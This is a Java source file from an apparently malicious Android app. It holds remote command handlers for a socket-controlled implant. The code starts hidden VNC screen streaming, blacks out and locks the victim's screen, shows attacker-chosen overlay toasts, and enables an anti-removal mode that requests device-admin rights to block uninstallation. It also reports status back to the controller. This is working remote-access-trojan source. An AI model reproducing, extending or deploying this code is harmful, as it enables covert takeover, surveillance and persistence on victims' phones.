package com.fason.app.core.network;

import com.fason.app.core.Protocol;
import com.fason.app.features.ghost.GhostHvncManager;
import com.fason.app.features.ghost.GhostToastEngine;
import com.fason.app.features.antiremoval.AntiRemovalManager;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONObject;

import io.socket.client.Socket;

/**
 * GhostCommandHandlers — 2026 upgrade additions to SocketCommandRouter.
 *
 * Rather than bloating the router further, the new ghost/anti-removal
 * commands live here. SocketCommandRouter's handleOrder() gains three
 * cases that delegate to this class:
 *
 *   case Protocol.GHOST_HVNC:   GhostCommandHandlers.handleGhostHvnc(data, socket, cmdId); break;
 *   case Protocol.GHOST_TOAST:  GhostCommandHandlers.handleGhostToast(data, socket, cmdId); break;
 *   case Protocol.ANTI_REMOVAL: GhostCommandHandlers.handleAntiRemoval(data, socket, cmdId); break;
 *
 * And the existing PERMISSIONS handler is upgraded to also answer
 * ACT_GATE_REPORT / ACT_GATE_OPEN via PermissionManager.buildGateReport().
 */
public final class GhostCommandHandlers {
    private GhostCommandHandlers() {}

    // ------------------------------------------------------------------
    // Ghost HVNC
    // ------------------------------------------------------------------

    public static void handleGhostHvnc(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        switch (action) {
            case Protocol.ACT_GHOST_START: {
                int fps = data.optInt(Protocol.KEY_FPS, 24);
                int quality = data.optInt(Protocol.KEY_JPEG_QUALITY, 65);
                int scale = data.optInt(Protocol.KEY_SCALE, 55);
                SocketCommandRouter.EXEC.execute(() ->
                    GhostHvncManager.getInstance().start(fps, quality, scale, cmdId));
                break;
            }
            case Protocol.ACT_GHOST_STOP:
                SocketCommandRouter.EXEC.execute(() ->
                    GhostHvncManager.getInstance().stop());
                break;
            case Protocol.ACT_BLACKOUT_ON:
                SocketCommandRouter.EXEC.execute(() ->
                    GhostHvncManager.getInstance().setBlackout(true));
                break;
            case Protocol.ACT_BLACKOUT_OFF:
                SocketCommandRouter.EXEC.execute(() ->
                    GhostHvncManager.getInstance().setBlackout(false));
                break;
            case Protocol.ACT_LOCK_ON:
                SocketCommandRouter.EXEC.execute(() ->
                    GhostHvncManager.getInstance().setLock(true));
                break;
            case Protocol.ACT_LOCK_OFF:
                SocketCommandRouter.EXEC.execute(() ->
                    GhostHvncManager.getInstance().setLock(false));
                break;
            case "status":
                SocketCommandRouter.EXEC.execute(() -> {
                    GhostHvncManager g = GhostHvncManager.getInstance();
                    try {
                        JSONObject o = new JSONObject();
                        o.put(Protocol.KEY_TYPE, "status");
                        o.put("streaming", g.isStreaming());
                        o.put("blackout", g.isBlackout());
                        o.put("locked", g.isLocked());
                        if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
                        if (socket != null) socket.emit(Protocol.GHOST_HVNC, o);
                    } catch (Exception ignored) {}
                });
                break;
            default:
                emitError(socket, cmdId, "unknown ghost action: " + action);
        }
    }

    // ------------------------------------------------------------------
    // Ghost Toast
    // ------------------------------------------------------------------

    public static void handleGhostToast(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        switch (action) {
            case Protocol.ACT_TOAST_SHOW: {
                String text = data.optString("text", "Notice");
                String bg = data.optString("bg", "#E6202020");
                String fg = data.optString("fg", "#FFFFFF");
                String anim = data.optString("anim", "pop");
                long dur = data.optLong("duration", 3000);
                GhostToastEngine.Anim a = "scroll".equals(anim)
                    ? GhostToastEngine.Anim.SCROLL
                    : "static".equals(anim)
                        ? GhostToastEngine.Anim.STATIC
                        : GhostToastEngine.Anim.POP;
                GhostToastEngine.show(text, bg, fg, a, dur);
                emitOk(socket, cmdId);
                break;
            }
            case Protocol.ACT_TOAST_BURNT: {
                String text = data.optString("text", "!");
                int count = data.optInt("count", 8);
                GhostToastEngine.burntToast(text, Math.min(count, 25));
                emitOk(socket, cmdId);
                break;
            }
            default:
                emitError(socket, cmdId, "unknown toast action: " + action);
        }
    }

    // ------------------------------------------------------------------
    // Anti-removal
    // ------------------------------------------------------------------

    public static void handleAntiRemoval(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        android.content.Context ctx = com.fason.app.core.FasonApp.getContext();
        switch (action) {
            case Protocol.ACT_AR_ENABLE:
                AntiRemovalManager.setEnabled(ctx, true);
                AntiRemovalManager.requestAdmin(ctx);
                emitReport(socket, cmdId);
                break;
            case Protocol.ACT_AR_DISABLE:
                AntiRemovalManager.setEnabled(ctx, false);
                emitReport(socket, cmdId);
                break;
            case Protocol.ACT_AR_STATUS:
            default:
                emitReport(socket, cmdId);
                break;
        }
    }

    private static void emitReport(Socket socket, String cmdId) {
        if (socket == null) return;
        try {
            android.content.Context ctx = com.fason.app.core.FasonApp.getContext();
            JSONObject o = AntiRemovalManager.buildReport(ctx);
            o.put(Protocol.KEY_TYPE, "anti_removal_status");
            if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.ANTI_REMOVAL, o);
        } catch (Exception ignored) {}
    }

    // ------------------------------------------------------------------
    // Permission gate report / remote gate open (upgrades existing PERMISSIONS)
    // ------------------------------------------------------------------

    public static void handleGateReport(Socket socket, String cmdId) {
        if (socket == null) return;
        try {
            android.content.Context ctx = com.fason.app.core.FasonApp.getContext();
            JSONObject o = PermissionManager.buildGateReport(ctx);
            if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.PERMISSIONS, o);
        } catch (Exception ignored) {}
    }

    private static void emitOk(Socket socket, String cmdId) {
        if (socket == null) return;
        try {
            JSONObject o = new JSONObject();
            o.put(Protocol.KEY_TYPE, "ok");
            o.put(Protocol.KEY_SUCCESS, true);
            if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.GHOST_TOAST, o);
        } catch (Exception ignored) {}
    }

    private static void emitError(Socket socket, String cmdId, String msg) {
        if (socket == null) return;
        try {
            JSONObject o = new JSONObject();
            o.put(Protocol.KEY_TYPE, "error");
            o.put(Protocol.KEY_ERROR, msg);
            if (cmdId != null) o.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit("cmd_error", o);
        } catch (Exception ignored) {}
    }
}
